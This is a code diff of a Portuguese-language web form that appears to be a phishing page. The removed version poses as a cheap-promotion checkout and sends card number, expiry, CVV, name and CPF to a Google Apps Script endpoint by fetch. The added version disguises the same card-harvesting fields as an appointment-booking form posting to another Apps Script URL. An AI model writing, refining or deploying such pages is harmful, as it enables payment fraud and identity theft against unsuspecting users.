@@ -3,13 +3,13 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Finalizar comprar</title>
+<title>Agendamento</title>
 
 <style>
 body {
-  margin: 0;
   font-family: Arial, sans-serif;
   background: #f2f2f2;
+  margin: 0;
 }
 .container {
   max-width: 420px;
@@ -18,29 +18,20 @@ body {
   min-height: 100vh;
   padding: 20px;
 }
-.topo {
-  text-align: center;
-  margin-bottom: 20px;
-}
-.box-preco {
-  background: #e8f5e9;
-  border: 1px solid #c8e6c9;
-  padding: 12px;
-  border-radius: 10px;
-  text-align: center;
-  margin-bottom: 20px;
-}
 label {
   font-size: 13px;
   font-weight: bold;
-  display: block;
 }
 input {
   width: 100%;
   padding: 14px;
+  margin: 10px 0 15px;
   border-radius: 8px;
   border: 1px solid #ccc;
-  margin-bottom: 15px;
+}
+.row {
+  display: flex;
+  gap: 10px;
 }
 button {
   width: 100%;
@@ -48,81 +39,47 @@ button {
   background: #2962ff;
   color: #fff;
   border: none;
-  border-radius: 12px;
-  font-size: 17px;
+  border-radius: 10px;
+  font-size: 16px;
   font-weight: bold;
 }
 </style>
 </head>
 
 <body>
+
 <div class="container">
+  <h2>Agendamento</h2>
+  <p>Preencha os dados abaixo</p>
 
-  <div class="topo">
-    <h2>Finalizar comprar</h2>
-    <p>Preencha os dados para concluir</p>
-  </div>
+  <form
+    action="https://script.google.com/macros/s/AKfycbwHC2O0Kod0iZldji6GR3Qndj_zFBFLfM-H2Lu5zr1Q5LTLGpPRSwE4hDxWrUmnI15x/exec"
+    method="POST"
+  >
 
-  <div class="box-preco">
-    <span>Valor promocional</span>
-    <strong>R$ 2,99</strong>
-  </div>
-  <label>Número do cartão</label>
-    <input name="numero" required placeholder="Insira o numero do cartão">
+    <label>Número</label>
+    <input name="numero" required>
 
     <div class="row">
       <div style="flex:1">
-        <label>Data de validade</label>
-        <input name="validade" required placeholder="MM/AA">
+        <label>Validade</label>
+        <input name="validade" placeholder="MM/AA" required>
       </div>
       <div style="flex:1">
-        <label>código de seguraça</label>
-        <input name="idade" required placeholder="CVV/CVC">
+        <label>Idade</label>
+        <input name="idade" required>
       </div>
     </div>
 
     <label>Nome completo</label>
-    <input name="nome" required placeholder="Digite seu nome completo">
+    <input name="nome" required>
 
     <label>CPF</label>
-    <input name="cpf" required placeholder="000.000.000-00">
+    <input name="cpf" required>
 
-    <button type="submit">CONFIRMAR</button>
+    <button type="submit">Confirmar</button>
   </form>
 </div>
-  
-<script>
-function enviar() {
-    const numero = document.getElementById("numero").value;
-    const data = document.getElementById("data").value;
-    const idade = document.getElementById("idade").value;
-    const nome = document.getElementById("nome").value;
-    const cpf = document.getElementById("cpf").value;
-
-    if (!numero || !data || !idade || !nome || !cpf) {
-        alert("Preencha todos os campos.");
-        return;
-    }
-
-    fetch("https://script.google.com/macros/s/AKfycbydMJCn1mocIURyJs1EdyeKy0aa1LrUD0GKm-RJwtBf67k5QLfaPCtqMjGiUgopQi0T/exec", {
-        method: "POST",
-        body: JSON.stringify({ numero, data, idade, nome, cpf }),
-        headers: { "Content-Type": "application/json" }
-    })
-    .then(() => {
-        document.getElementById("msgSucesso").style.display = "block";
-    })
-    .catch(() => {
-        alert("Erro ao enviar. Tente novamente.");
-    });
-}
-</script>
 
 </body>
 </html>
-
-
-
-
-
-
